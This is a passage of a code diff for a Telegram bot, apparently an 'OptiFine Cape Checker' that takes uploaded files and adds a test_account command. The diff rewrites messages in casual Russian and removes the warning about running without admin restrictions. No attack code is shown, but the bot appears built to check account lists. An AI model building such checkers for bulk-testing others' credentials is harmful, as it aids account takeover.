+    logger.error(f"Ошибка: {context.error}")
     try:
         if update and update.message:
-            await update.message.reply_text(
-                "❌ **Произошла внутренняя ошибка.**\n"
-                "Пожалуйста, попробуйте позже или обратитесь к администратору.",
-                parse_mode=ParseMode.MARKDOWN
-            )
+            await update.message.reply_text("❌ Что-то сломалось, сорян")
     except:
         pass
 
 def main():
-    """Запуск бота"""
-    # Проверяем наличие токена
+    """Запуск"""
     if not TOKEN:
-        logger.error("❌ BOT_TOKEN not set in environment variables!")
-        print("❌ ERROR: BOT_TOKEN not set!")
+        print("❌ НЕТ ТОКЕНА! Добавь BOT_TOKEN в переменные окружения")
         return
     
-    # Проверяем админов
-    if not ADMIN_IDS:
-        logger.warning("⚠️ ADMIN_IDS not set - anyone can use the bot!")
-        print("⚠️ WARNING: No admin IDs set - anyone can use the bot!")
-    
-    print("=" * 50)
-    print("🚀 Starting OptiFine Cape Checker Bot...")
-    print(f"📊 Initial stats: {stats}")
-    print(f"👥 Admin IDs: {ADMIN_IDS if ADMIN_IDS else 'No admins set'}")
-    print("=" * 50)
+    print("="*50)
+    print("🚀 Запускаю OptiFine Cape Checker...")
+    print(f"📊 Стата: {stats}")
+    print(f"👥 Админы: {ADMIN_IDS if ADMIN_IDS else 'Нет админов - бот для всех'}")
+    print("="*50)
     
     try:
-        # Создаем приложение
         application = Application.builder().token(TOKEN).build()
         
-        # Добавляем обработчики
         application.add_handler(CommandHandler("start", start))
         application.add_handler(CommandHandler("help", help_command))
         application.add_handler(CommandHandler("stats", stats_command))
+        application.add_handler(CommandHandler("test", test_account))
         application.add_handler(CallbackQueryHandler(button_callback))
         application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-        
-        # Обработчик ошибок
         application.add_error_handler(error_handler)
         
-        # Запускаем бота
-        print("✅ Bot is running! Press Ctrl+C to stop.")
+        print("✅ Бот работает! Жду файлы...")
         application.run_polling(allowed_updates=Update.ALL_TYPES)
         
     except Exception as e:
-        logger.error(f"Fatal error: {e}")
-        print(f"❌ Fatal error: {e}")
+        logger.error(f"Фатальная ошибка: {e}")
+        print(f"❌ Ошибка: {e}")
 
 if __name__ == '__main__':
     main()
